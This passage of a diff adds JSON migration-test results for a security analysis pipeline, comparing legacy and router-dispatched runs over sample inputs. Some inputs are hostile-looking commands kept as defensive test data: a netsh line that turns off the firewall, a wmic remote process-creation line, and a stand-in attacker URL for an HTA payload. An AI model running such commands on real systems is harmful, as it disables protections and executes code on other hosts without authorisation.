+          "techniques"
+        ],
+        "report_hash": "52440b079e4ca00d5c0d5cb9b0a9d4b2969c6ae308c60063cdc104184d29e5b3",
+        "report_section_titles": [
+          "Executive Summary",
+          "Overall Assessment",
+          "Behavior Summary",
+          "Attack Story",
+          "Recovered Artifacts",
+          "Technical Findings",
+          "MITRE Coverage",
+          "Attack Intent",
+          "Evidence Summary",
+          "Detection Opportunities",
+          "Recommendations",
+          "Confidence Summary"
+        ]
+      },
+      "router": {
+        "outcomes": [
+          {
+            "entry_id": "die.recursive.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.recursive_decode:extract_decoded_layers",
+            "result_hash": "4f53cda18c2baa0c0354bb5f9a3ecbe5ed12ab4d8e11ba873c2f11161202b945",
+            "status": "success",
+            "step_id": "s00_die_recursive_v1"
+          },
+          {
+            "entry_id": "die.command.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.api:analyze",
+            "result_hash": "f06a2a309b1f9e952b3f8ff06cf729a52648d9fa3d56ecb4364a88d71ccbf6a9",
+            "status": "success",
+            "step_id": "s01_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.narrative:generate_report",
+            "result_hash": "52440b079e4ca00d5c0d5cb9b0a9d4b2969c6ae308c60063cdc104184d29e5b3",
+            "status": "success",
+            "step_id": "s02_report_narrative_v1"
+          }
+        ],
+        "plumbing_gaps": [
+          {
+            "entry_id": "die.recursive.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s00_die_recursive_v1"
+          },
+          {
+            "entry_id": "die.command.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s01_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s02_report_narrative_v1"
+          }
+        ],
+        "projected_steps": [
+          [
+            "s00_die_recursive_v1",
+            "die.recursive.v1"
+          ],
+          [
+            "s01_die_command_v1",
+            "die.command.v1"
+          ],
+          [
+            "s02_report_narrative_v1",
+            "report.narrative.v1"
+          ]
+        ],
+        "unmapped_engines": []
+      },
+      "verdict": "GAPS-REQUIRE-MIGRATION"
+    },
+    {
+      "differences": {
+        "duplicate_execution": [],
+        "expected_additive": [],
+        "expected_structural": [
+          {
+            "axis": "call graph",
+            "legacy": "analyze() \u2192 generate_report()",
+            "note": "router path decomposes the pipeline; legacy is 2 inline calls",
+            "router": "3 router-dispatched successes over 3 steps"
+          },
+          {
+            "axis": "unmapped legacy engines (class-B bundled)",
+            "note": "these stages run inside die.command.v1 or report.narrative.v1 as sub-behaviour (per ADR-0014d classification)",
+            "unmapped": [
+              "DKP (Decoder Knowledge Pack)",
+              "Attack Intent",
+              "Attack Story"
+            ]
+          },
+          {
+            "axis": "async dispatch (M0d-async-extension)",
+            "entry_id": "ioc_enrichment.v1",
+            "impl": "analysis_core:enrich_iocs",
+            "note": "callable is async; router awaited it via M0d-async-extension. Result captured is the real value, not a coroutine object.",
+            "step_id": "s05_ioc_enrichment_v1"
+          }
+        ],
+        "failure_semantics": [],
+        "identical": [
+          {
+            "axis": "die.command.v1 envelope",
+            "hash": "ceccd570314ed8b93a65c35c882515f073f218989abfad48534b7b8a5befb68d",
+            "note": "router-dispatched invocation is byte-identical to inline"
+          },
+          {
+            "axis": "report.narrative.v1 output",
+            "hash": "642321408330a1944caea98ee8420ef2c0c2dc642402e9a07f0b212a425ef7d4"
+          }
+        ],
+        "missing_capability": [
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s00_die_command_v1"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s04_report_narrative_v1"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s05_ioc_enrichment_v1"
+          }
+        ],
+        "ordering": [
+          {
+            "axis": "execution order",
+            "legacy": [
+              "analyze",
+              "generate_report"
+            ],
+            "router": [
+              "s00_die_command_v1",
+              "s04_report_narrative_v1",
+              "s05_ioc_enrichment_v1"
+            ]
+          }
+        ],
+        "unexpected": []
+      },
+      "input": {
+        "iue_engines_selected": [
+          "DIE (Semantic AST)",
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent",
+          "Attack Story",
+          "Report Generator",
+          "IOC Enrichment"
+        ],
+        "name": "narrative_short_attack",
+        "text_head": "The actor deployed a remote access trojan and used PowerShell to execute an enco"
+      },
+      "legacy": {
+        "envelope_hash": "ceccd570314ed8b93a65c35c882515f073f218989abfad48534b7b8a5befb68d",
+        "envelope_keys": [
+          "ast",
+          "attack_intent",
+          "cmdlets",
+          "dkp_matches",
+          "iocs",
+          "iocs_summary",
+          "language",
+          "lolbins",
+          "obfuscation_score",
+          "techniques"
+        ],
+        "report_hash": "642321408330a1944caea98ee8420ef2c0c2dc642402e9a07f0b212a425ef7d4",
+        "report_section_titles": [
+          "Executive Summary",
+          "Overall Assessment",
+          "Behavior Summary",
+          "Attack Story",
+          "Recovered Artifacts",
+          "Technical Findings",
+          "MITRE Coverage",
+          "Attack Intent",
+          "Evidence Summary",
+          "Detection Opportunities",
+          "Recommendations",
+          "Confidence Summary"
+        ]
+      },
+      "router": {
+        "outcomes": [
+          {
+            "entry_id": "die.command.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.api:analyze",
+            "result_hash": "ceccd570314ed8b93a65c35c882515f073f218989abfad48534b7b8a5befb68d",
+            "status": "success",
+            "step_id": "s00_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.narrative:generate_report",
+            "result_hash": "642321408330a1944caea98ee8420ef2c0c2dc642402e9a07f0b212a425ef7d4",
+            "status": "success",
+            "step_id": "s04_report_narrative_v1"
+          },
+          {
+            "entry_id": "ioc_enrichment.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "analysis_core:enrich_iocs",
+            "result_hash": "9319e13fed79d01378d23dba0a6cb5e7ef6a600826e6e6d10ddc90df9e429632",
+            "status": "success",
+            "step_id": "s05_ioc_enrichment_v1"
+          }
+        ],
+        "plumbing_gaps": [
+          {
+            "entry_id": "die.command.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s00_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s04_report_narrative_v1"
+          },
+          {
+            "entry_id": "ioc_enrichment.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s05_ioc_enrichment_v1"
+          }
+        ],
+        "projected_steps": [
+          [
+            "s00_die_command_v1",
+            "die.command.v1"
+          ],
+          [
+            "s04_report_narrative_v1",
+            "report.narrative.v1"
+          ],
+          [
+            "s05_ioc_enrichment_v1",
+            "ioc_enrichment.v1"
+          ]
+        ],
+        "unmapped_engines": [
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent",
+          "Attack Story"
+        ]
+      },
+      "verdict": "GAPS-REQUIRE-MIGRATION"
+    },
+    {
+      "differences": {
+        "duplicate_execution": [],
+        "expected_additive": [],
+        "expected_structural": [
+          {
+            "axis": "call graph",
+            "legacy": "analyze() \u2192 generate_report()",
+            "note": "router path decomposes the pipeline; legacy is 2 inline calls",
+            "router": "2 router-dispatched successes over 2 steps"
+          },
+          {
+            "axis": "unmapped legacy engines (class-B bundled)",
+            "note": "these stages run inside die.command.v1 or report.narrative.v1 as sub-behaviour (per ADR-0014d classification)",
+            "unmapped": [
+              "DKP (Decoder Knowledge Pack)",
+              "Attack Intent"
+            ]
+          }
+        ],
+        "failure_semantics": [],
+        "identical": [
+          {
+            "axis": "die.command.v1 envelope",
+            "hash": "309451b2a374e83dd31b86cde33b3e47c08ded31ce2a87aac5cf20a7d7dab213",
+            "note": "router-dispatched invocation is byte-identical to inline"
+          },
+          {
+            "axis": "report.narrative.v1 output",
+            "hash": "cb87fef11a5869b4b2acd2c8c4c6153dc543ddc99a2757ecd90ccb2f331c968f"
+          }
+        ],
+        "missing_capability": [
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s00_die_command_v1"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s03_report_narrative_v1"
+          }
+        ],
+        "ordering": [
+          {
+            "axis": "execution order",
+            "legacy": [
+              "analyze",
+              "generate_report"
+            ],
+            "router": [
+              "s00_die_command_v1",
+              "s03_report_narrative_v1"
+            ]
+          }
+        ],
+        "unexpected": []
+      },
+      "input": {
+        "iue_engines_selected": [
+          "DIE (Semantic AST)",
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent",
+          "Report Generator"
+        ],
+        "name": "netsh_firewall_off",
+        "text_head": "netsh advfirewall set allprofiles state off"
+      },
+      "legacy": {
+        "envelope_hash": "309451b2a374e83dd31b86cde33b3e47c08ded31ce2a87aac5cf20a7d7dab213",
+        "envelope_keys": [
+          "ast",
+          "attack_intent",
+          "cmdlets",
+          "dkp_matches",
+          "iocs",
+          "iocs_summary",
+          "language",
+          "lolbins",
+          "obfuscation_score",
+          "techniques"
+        ],
+        "report_hash": "cb87fef11a5869b4b2acd2c8c4c6153dc543ddc99a2757ecd90ccb2f331c968f",
+        "report_section_titles": [
+          "Executive Summary",
+          "Overall Assessment",
+          "Behavior Summary",
+          "Attack Story",
+          "Recovered Artifacts",
+          "Technical Findings",
+          "MITRE Coverage",
+          "Attack Intent",
+          "Evidence Summary",
+          "Detection Opportunities",
+          "Recommendations",
+          "Confidence Summary"
+        ]
+      },
+      "router": {
+        "outcomes": [
+          {
+            "entry_id": "die.command.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.api:analyze",
+            "result_hash": "309451b2a374e83dd31b86cde33b3e47c08ded31ce2a87aac5cf20a7d7dab213",
+            "status": "success",
+            "step_id": "s00_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.narrative:generate_report",
+            "result_hash": "cb87fef11a5869b4b2acd2c8c4c6153dc543ddc99a2757ecd90ccb2f331c968f",
+            "status": "success",
+            "step_id": "s03_report_narrative_v1"
+          }
+        ],
+        "plumbing_gaps": [
+          {
+            "entry_id": "die.command.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s00_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s03_report_narrative_v1"
+          }
+        ],
+        "projected_steps": [
+          [
+            "s00_die_command_v1",
+            "die.command.v1"
+          ],
+          [
+            "s03_report_narrative_v1",
+            "report.narrative.v1"
+          ]
+        ],
+        "unmapped_engines": [
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent"
+        ]
+      },
+      "verdict": "GAPS-REQUIRE-MIGRATION"
+    },
+    {
+      "differences": {
+        "duplicate_execution": [],
+        "expected_additive": [],
+        "expected_structural": [
+          {
+            "axis": "call graph",
+            "legacy": "analyze() \u2192 generate_report()",
+            "note": "router path decomposes the pipeline; legacy is 2 inline calls",
+            "router": "2 router-dispatched successes over 2 steps"
+          },
+          {
+            "axis": "unmapped legacy engines (class-B bundled)",
+            "note": "these stages run inside die.command.v1 or report.narrative.v1 as sub-behaviour (per ADR-0014d classification)",
+            "unmapped": [
+              "DKP (Decoder Knowledge Pack)",
+              "Attack Intent"
+            ]
+          }
+        ],
+        "failure_semantics": [],
+        "identical": [
+          {
+            "axis": "die.command.v1 envelope",
+            "hash": "274fe87856e92ffe3ad918b3475ddb6dc1af1daa1245601e22cfcc700de86b6e",
+            "note": "router-dispatched invocation is byte-identical to inline"
+          },
+          {
+            "axis": "report.narrative.v1 output",
+            "hash": "8e4950f4bdedd01245244398331eeff59d163d8dcb427704d2fb8ba0bf2c6e8a"
+          }
+        ],
+        "missing_capability": [
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s00_die_command_v1"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s03_report_narrative_v1"
+          }
+        ],
+        "ordering": [
+          {
+            "axis": "execution order",
+            "legacy": [
+              "analyze",
+              "generate_report"
+            ],
+            "router": [
+              "s00_die_command_v1",
+              "s03_report_narrative_v1"
+            ]
+          }
+        ],
+        "unexpected": []
+      },
+      "input": {
+        "iue_engines_selected": [
+          "DIE (Semantic AST)",
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent",
+          "Report Generator"
+        ],
+        "name": "wmic_process_create",
+        "text_head": "wmic /node:target process call create \"cmd.exe /c whoami\""
+      },
+      "legacy": {
+        "envelope_hash": "274fe87856e92ffe3ad918b3475ddb6dc1af1daa1245601e22cfcc700de86b6e",
+        "envelope_keys": [
+          "ast",
+          "attack_intent",
+          "cmdlets",
+          "dkp_matches",
+          "iocs",
+          "iocs_summary",
+          "language",
+          "lolbins",
+          "obfuscation_score",
+          "preprocessor",
+          "techniques"
+        ],
+        "report_hash": "8e4950f4bdedd01245244398331eeff59d163d8dcb427704d2fb8ba0bf2c6e8a",
+        "report_section_titles": [
+          "Executive Summary",
+          "Overall Assessment",
+          "Behavior Summary",
+          "Attack Story",
+          "Recovered Artifacts",
+          "Technical Findings",
+          "MITRE Coverage",
+          "Attack Intent",
+          "Evidence Summary",
+          "Detection Opportunities",
+          "Recommendations",
+          "Confidence Summary"
+        ]
+      },
+      "router": {
+        "outcomes": [
+          {
+            "entry_id": "die.command.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.api:analyze",
+            "result_hash": "274fe87856e92ffe3ad918b3475ddb6dc1af1daa1245601e22cfcc700de86b6e",
+            "status": "success",
+            "step_id": "s00_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.narrative:generate_report",
+            "result_hash": "8e4950f4bdedd01245244398331eeff59d163d8dcb427704d2fb8ba0bf2c6e8a",
+            "status": "success",
+            "step_id": "s03_report_narrative_v1"
+          }
+        ],
+        "plumbing_gaps": [
+          {
+            "entry_id": "die.command.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s00_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s03_report_narrative_v1"
+          }
+        ],
+        "projected_steps": [
+          [
+            "s00_die_command_v1",
+            "die.command.v1"
+          ],
+          [
+            "s03_report_narrative_v1",
+            "report.narrative.v1"
+          ]
+        ],
+        "unmapped_engines": [
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent"
+        ]
+      },
+      "verdict": "GAPS-REQUIRE-MIGRATION"
+    },
+    {
+      "differences": {
+        "duplicate_execution": [],
+        "expected_additive": [],
+        "expected_structural": [
+          {
+            "axis": "call graph",
+            "legacy": "analyze() \u2192 generate_report()",
+            "note": "router path decomposes the pipeline; legacy is 2 inline calls",
+            "router": "1 router-dispatched successes over 2 steps"
+          },
+          {
+            "axis": "async dispatch (M0d-async-extension)",
+            "entry_id": "ioc_enrichment.v1",
+            "impl": "analysis_core:enrich_iocs",
+            "note": "callable is async; router awaited it via M0d-async-extension. Result captured is the real value, not a coroutine object.",
+            "step_id": "s00_ioc_enrichment_v1"
+          }
+        ],
+        "failure_semantics": [
+          {
+            "axis": "router step failures",
+            "failures": [
+              {
+                "error": "'NoneType' object has no attribute 'upper'",
+                "status": "execution_failed",
+                "step_id": "s01_report_narrative_v1"
+              }
+            ],
+            "note": "legacy path collapses these into a single analyze() call so the same failures may or may not surface identically"
+          }
+        ],
+        "identical": [],
+        "missing_capability": [
+          {
+            "axis": "envelope",
+            "note": "router path never produced a DIE envelope for input 'url_with_suspicious_path' \u2014 legacy path always produces one via services.die.api:analyze"
+          },
+          {
+            "axis": "report.narrative.v1",
+            "note": "router path never produced a report for input 'url_with_suspicious_path' \u2014 report.narrative.v1 either did not run or produced None"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s00_ioc_enrichment_v1"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s01_report_narrative_v1"
+          }
+        ],
+        "ordering": [
+          {
+            "axis": "execution order",
+            "legacy": [
+              "analyze",
+              "generate_report"
+            ],
+            "router": [
+              "s00_ioc_enrichment_v1",
+              "s01_report_narrative_v1"
+            ]
+          }
+        ],
+        "unexpected": []
+      },
+      "input": {
+        "iue_engines_selected": [
+          "IOC Enrichment",
+          "Report Generator"
+        ],
+        "name": "url_with_suspicious_path",
+        "text_head": "https://example-cdn.attacker.test/download/payload.hta"
+      },
+      "legacy": {
+        "envelope_hash": "4284e3d9de04cafdea92faeb91f5063f49f235ee089fafe0771cb8fd11ee41e8",
+        "envelope_keys": [
+          "ast",
+          "cmdlets",
+          "dkp_matches",
+          "iocs",
+          "iocs_summary",
+          "language",
+          "lolbins",
+          "obfuscation_score",
+          "techniques"
+        ],
+        "report_hash": "221f7f1a979ed0620402c584d4ce46d9433d39199d040ea528fc97d349f9bfda",
+        "report_section_titles": [
+          "Executive Summary",
+          "Overall Assessment",
+          "Behavior Summary",
+          "Attack Story",
+          "Recovered Artifacts",
+          "Technical Findings",
+          "MITRE Coverage",
+          "Attack Intent",
+          "Evidence Summary",
+          "Detection Opportunities",
+          "Recommendations",
+          "Confidence Summary"
+        ]
+      },
+      "router": {
+        "outcomes": [
+          {
+            "entry_id": "ioc_enrichment.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "analysis_core:enrich_iocs",
+            "result_hash": "9319e13fed79d01378d23dba0a6cb5e7ef6a600826e6e6d10ddc90df9e429632",
+            "status": "success",
+            "step_id": "s00_ioc_enrichment_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "error": "'NoneType' object has no attribute 'upper'",
+            "error_type": "AttributeError",
+            "implementation": "services.die.narrative:generate_report",
+            "result_hash": null,
+            "status": "execution_failed",
+            "step_id": "s01_report_narrative_v1"
+          }
+        ],
+        "plumbing_gaps": [
+          {
+            "entry_id": "ioc_enrichment.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s00_ioc_enrichment_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s01_report_narrative_v1"
+          }
+        ],
+        "projected_steps": [
+          [
+            "s00_ioc_enrichment_v1",
+            "ioc_enrichment.v1"
+          ],
+          [
+            "s01_report_narrative_v1",
+            "report.narrative.v1"
+          ]
+        ],
+        "unmapped_engines": []
+      },
+      "verdict": "GAPS-REQUIRE-MIGRATION"
+    },
+    {
+      "differences": {
+        "duplicate_execution": [],
+        "expected_additive": [],
+        "expected_structural": [
+          {
+            "axis": "call graph",
+            "legacy": "analyze() \u2192 generate_report()",
+            "note": "router path decomposes the pipeline; legacy is 2 inline calls",
+            "router": "1 router-dispatched successes over 2 steps"
+          },
+          {
+            "axis": "unmapped legacy engines (class-B bundled)",
+            "note": "these stages run inside die.command.v1 or report.narrative.v1 as sub-behaviour (per ADR-0014d classification)",
+            "unmapped": [
+              "Preprocessor"
+            ]
+          },
+          {
+            "axis": "async dispatch (M0d-async-extension)",
+            "entry_id": "ioc_enrichment.v1",
+            "impl": "analysis_core:enrich_iocs",
+            "note": "callable is async; router awaited it via M0d-async-extension. Result captured is the real value, not a coroutine object.",
+            "step_id": "s01_ioc_enrichment_v1"
+          }
+        ],
+        "failure_semantics": [
+          {
+            "axis": "router step failures",
+            "failures": [
+              {
+                "error": "'NoneType' object has no attribute 'upper'",
+                "status": "execution_failed",
+                "step_id": "s02_report_narrative_v1"
+              }
+            ],
+            "note": "legacy path collapses these into a single analyze() call so the same failures may or may not surface identically"
+          }
+        ],
+        "identical": [],
+        "missing_capability": [
+          {
+            "axis": "envelope",
+            "note": "router path never produced a DIE envelope for input 'empty_input' \u2014 legacy path always produces one via services.die.api:analyze"
+          },
+          {
+            "axis": "report.narrative.v1",
+            "note": "router path never produced a report for input 'empty_input' \u2014 report.narrative.v1 either did not run or produced None"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s01_ioc_enrichment_v1"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s02_report_narrative_v1"
+          }
+        ],
+        "ordering": [
+          {
+            "axis": "execution order",
+            "legacy": [
+              "analyze",
+              "generate_report"
+            ],
+            "router": [
+              "s01_ioc_enrichment_v1",
+              "s02_report_narrative_v1"
+            ]
+          }
+        ],
+        "unexpected": []
+      },
+      "input": {
+        "iue_engines_selected": [
+          "Preprocessor",
+          "IOC Enrichment",
+          "Report Generator"
+        ],
+        "name": "empty_input",
+        "text_head": ""
+      },
+      "legacy": {
+        "envelope_hash": "1facdc846b932bf9edaf5c82c8ec67a7781f575d482626bf4808ed66f779234d",
+        "envelope_keys": [
+          "ast",
+          "cmdlets",
+          "iocs",
+          "iocs_summary",
+          "language",
+          "lolbins",
+          "obfuscation_score",
+          "techniques"
+        ],
+        "report_hash": "a5e65235dd632463e1b03f43684e722c4a64c01fb38c38f5cd86ee68eb4c75d3",
+        "report_section_titles": [
+          "Executive Summary",
+          "Overall Assessment",
+          "Behavior Summary",
+          "Attack Story",
+          "Recovered Artifacts",
+          "Technical Findings",
+          "MITRE Coverage",
+          "Attack Intent",
+          "Evidence Summary",
+          "Detection Opportunities",
+          "Recommendations",
+          "Confidence Summary"
+        ]
+      },
+      "router": {
+        "outcomes": [
+          {
+            "entry_id": "ioc_enrichment.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "analysis_core:enrich_iocs",
+            "result_hash": "9319e13fed79d01378d23dba0a6cb5e7ef6a600826e6e6d10ddc90df9e429632",
+            "status": "success",
+            "step_id": "s01_ioc_enrichment_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "error": "'NoneType' object has no attribute 'upper'",
+            "error_type": "AttributeError",
+            "implementation": "services.die.narrative:generate_report",
+            "result_hash": null,
+            "status": "execution_failed",
+            "step_id": "s02_report_narrative_v1"
+          }
+        ],
+        "plumbing_gaps": [
+          {
+            "entry_id": "ioc_enrichment.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s01_ioc_enrichment_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s02_report_narrative_v1"
+          }
+        ],
+        "projected_steps": [
+          [
+            "s01_ioc_enrichment_v1",
+            "ioc_enrichment.v1"
+          ],
+          [
+            "s02_report_narrative_v1",
+            "report.narrative.v1"
+          ]
+        ],
+        "unmapped_engines": [
+          "Preprocessor"
+        ]
+      },
+      "verdict": "GAPS-REQUIRE-MIGRATION"
+    }
+  ]
+}
